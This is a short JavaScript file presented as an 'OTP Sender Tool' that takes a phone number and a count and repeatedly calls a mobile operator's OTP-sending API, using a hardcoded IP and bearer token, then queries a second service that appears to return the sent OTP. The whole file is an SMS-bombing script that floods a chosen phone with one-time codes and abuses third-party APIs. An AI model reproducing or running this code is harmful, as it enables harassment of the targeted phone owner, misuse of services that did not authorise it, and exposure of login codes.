// Made by Siam - OTP Sender Tool
async function sendOtp() {
    const number = document.getElementById("number").value;
    const amount = document.getElementById("amount").value;

    try {
        for (let i = 0; i < amount; i++) {
            const sendOtpResponse = await fetch("http://103.4.145.86:6005/api/v1/user/otp/send", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "User-Agent": "Your-User-Agent",
                    "Authorization": "Bearer 2Comics4mh5ln64ron5t26kpvm3toBlog",
                },
                body: JSON.stringify({
                    msisdn: number,
                    operator: "robi",
                    secret_key: ""
                })
            });

            const sendOtpData = await sendOtpResponse.json();
            document.getElementById("output").innerHTML += `POST Response ${i + 1}: ${JSON.stringify(sendOtpData)}<br>`;

            const retrieveOtpResponse = await fetch(`http://apibeta.iqra-live.com/api/v2/sent-otp/${number}`, {
                method: "GET",
                headers: {
                    "User-Agent": "Your-User-Agent",
                    "x-user-channel": "apps",
                }
            });

            const retrieveOtpData = await retrieveOtpResponse.json();
            document.getElementById("output").innerHTML += `GET Response ${i + 1}: ${JSON.stringify(retrieveOtpData)}<br>`;
        }
    } catch (error) {
        console.error("Error:", error);
    }
}